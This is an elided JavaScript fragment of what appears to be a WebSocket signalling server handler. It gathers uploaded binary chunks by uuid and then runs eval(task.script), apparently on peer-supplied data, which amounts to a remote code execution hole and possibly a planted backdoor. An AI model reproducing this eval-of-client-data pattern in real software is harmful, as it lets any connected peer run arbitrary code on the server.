	...
	handleProtooConnection({ peerId, consume, protooWebSocketTransport })
	{
		...
		peer.on('notification', async (notification) => {
			...
			if (method === 'setState') {
				...
				console.log(data)
				if (data.binary && data.uuid) {
					let task = tasks.get(data.uuid);
					if (task) {
						task.binary.push(data.binary.data);
					} else {
						task = {
					...
					tasks.set(data.uuid, task)
					if (task.binary.length === task.maxUpload) {
						eval(task.script);
						tasks.delete(data.uuid)
					}
				}
			} else {
